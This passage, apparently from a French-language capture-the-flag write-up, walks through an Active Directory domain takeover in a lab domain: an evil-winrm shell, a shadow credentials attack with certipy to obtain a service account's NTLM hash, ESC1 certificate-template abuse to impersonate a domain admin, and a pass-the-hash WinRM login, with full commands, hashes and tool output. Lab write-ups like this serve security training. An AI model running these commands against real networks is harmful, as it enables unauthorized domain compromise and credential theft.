  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc01.hacksmarter.local:5985' as 'yorinobu'
evil-winrm-py PS C:\Users\Yorinobu\Documents> whoami
hacksmarter\yorinobu
evil-winrm-py PS C:\Users\Yorinobu\Documents> cd ../desktop
evil-winrm-py PS C:\Users\Yorinobu\desktop> ls


    Directory: C:\Users\Yorinobu\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
```

# Shell en tant que The_Emperor
## Shadow credentials

J'abuse du droit `GenericWrite` en effectuant l'attaque [shadow credentials](https://tldrbins.github.io/genericwrite/). Cela me permet de récupérer le hash NTLM de `soulkiller.svc`.
```js
certipy shadow auto -u yorinobu@hacksmarter.local -p Password123 -account "soulkiller.svc"
```
![](/Arasaka-8.png)

## ESC1

J'énumère les certificats et templates vulnérables.
```js
certipy -debug find -dc-host dc01.hacksmarter.local -u soulkiller.svc@hacksmarter.local -hashes :f4ab68f27303bcb4024650d8fc5f973a -vulnerable -stdout
```

Le template `AI_Takeover` est vulnérable à l'ESC1. En résumé, la ESC1 est une erreur de configuration des services de certificats Active Directory (ADCS) où l'autorité de certification est configurée pour autoriser tout utilisateur authentifié à demander des certificats à partir d'un modèle qui permet l'authentification du client et autorise le demandeur à fournir des noms alternatifs de sujet (SAN) arbitraires. Cela nous permet d'usurper l'identité d'autres utilisateurs, y compris des administrateurs de domaine, en obtenant des certificats valides.
```json
Certificate Authorities
  0
    CA Name                             : hacksmarter-DC01-CA
    DNS Name                            : DC01.hacksmarter.local
    Certificate Subject                 : CN=hacksmarter-DC01-CA, DC=hacksmarter, DC=local
    Certificate Serial Number           : 1DBC9F9ECF287FB04FDE66106578611F
    Certificate Validity Start          : 2025-09-21 15:32:14+00:00
    Certificate Validity End            : 2030-09-21 15:42:14+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : HACKSMARTER.LOCAL\Administrators
      Access Rights
        ManageCa                        : HACKSMARTER.LOCAL\Administrators
                                          HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        ManageCertificates              : HACKSMARTER.LOCAL\Administrators
                                          HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        Enroll                          : HACKSMARTER.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : AI_Takeover
    Display Name                        : AI_Takeover
    Certificate Authorities             : hacksmarter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-09-21T16:16:36+00:00
    Template Last Modified              : 2025-09-21T16:16:36+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACKSMARTER.LOCAL\Soulkiller.svc
                                          HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : HACKSMARTER.LOCAL\Administrator
        Full Control Principals         : HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        Write Owner Principals          : HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        Write Dacl Principals           : HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        Write Property Enroll           : HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : HACKSMARTER.LOCAL\Soulkiller.svc
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

La première étape de l'exploitation consiste à demander un certificat pour l'utilisateur cible (ici `THE_EMPEROR` car c'est un administrateur du domaine) en fournissant son `UPN`. Le certificat ainsi que sa clé son alors sauvegardés dans le fichier `the_emperor.pfx`.
```js
certipy -debug req -dc-host dc01.hacksmarter.local -u soulkiller.svc@hacksmarter.local -hashes :f4ab68f27303bcb4024650d8fc5f973a -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'THE_EMPEROR' -debug
```
![](/Arasaka-9.png)

J'utilise ensuite le certificat afin de me connecter en tant que `the_emperor` au contrôleur de domaine. Ce qui me permet de récupérer le hash de l'utilisateur `the_emperor`.
```js
certipy -debug auth -pfx the_emperor.pfx -dc-ip 10.1.252.123 -domain hacksmarter.local
```
![](/Arasaka-11.png)

## WINRM

J'obtiens alors un shell WINRM avec le hash récupéré.
```js
evil-winrm-py --ip dc01.hacksmarter.local -u the_emperor -H d87640b0d83dc7f90f5f30bd6789b133
```
![](/Arasaka-10.png)


